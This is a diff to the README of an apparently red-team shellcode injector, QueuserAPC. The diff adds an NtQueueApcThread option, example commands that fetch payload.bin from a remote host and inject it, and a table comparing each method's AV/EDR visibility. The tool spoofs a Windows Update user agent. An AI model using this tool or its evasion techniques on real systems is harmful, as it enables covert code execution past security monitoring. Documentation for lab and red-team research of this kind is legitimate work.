@@ -43,20 +43,36 @@ Output: `QueuserAPC\bin\Release\net8.0\QueuserAPC.exe`
 ## Usage
 
 ```
-QueuserAPC.exe <shellcode-url>
+QueuserAPC.exe [--nt] <shellcode-url>
 ```
 
 | Argument | Description |
 |---|---|
 | `<shellcode-url>` | URL serving raw shellcode bytes (HTTP or HTTPS) |
+| `--nt` | Use `NtQueueApcThread` (ntdll) instead of `QueueUserAPC` (kernel32) — see below |
 
-**Example:**
+**Examples:**
 
 ```
+# Default — QueueUserAPC variant (kernel32)
 QueuserAPC.exe https://192.168.1.10/payload.bin
+
+# NtQueueApcThread variant (ntdll)
+QueuserAPC.exe --nt https://192.168.1.10/payload.bin
 ```
 
 > The HTTP client sends a `Windows-Update-Agent` User-Agent string and skips TLS certificate validation — suitable for lab environments using self-signed certificates.
+
+### QueueUserAPC vs NtQueueApcThread
+
+| | `QueueUserAPC` | `NtQueueApcThread` |
+|---|---|---|
+| Library | `kernel32.dll` | `ntdll.dll` |
+| Documented | Yes | No (undocumented NTDLL export) |
+| Alertable state required | Yes — thread must enter alertable wait | No — fires on `ResumeThread` from `CREATE_SUSPENDED` |
+| AV/EDR visibility | Higher (common LOLBin path) | Lower (NTDLL syscall tier) |
+
+Both variants target a `CREATE_SUSPENDED` process, so either works in the Early-Bird pattern. The `--nt` variant operates at the NTDLL tier, bypassing the higher-level Win32 APC dispatch and offering a lighter EDR footprint.
 
 ---
 
@@ -111,6 +127,7 @@ Hooks run automatically on `git commit`:
 | 8 | ✅ Done | xUnit test project — CLI argument validation and URL guard (Win32 calls are integration-level and excluded) |
 | 9 | ✅ Done | detect-secrets baseline (`.secrets.baseline`) + pre-commit hook + CI step |
 | 10 | ✅ Done | CI matrix build for both Debug and Release configurations |
+| [#8](https://github.com/incendiary/QueuserAPC/issues/8) | ✅ Done | `NtQueueApcThread` variant — `--nt` flag selects ntdll tier; comparison table in README |
 
 ---
 
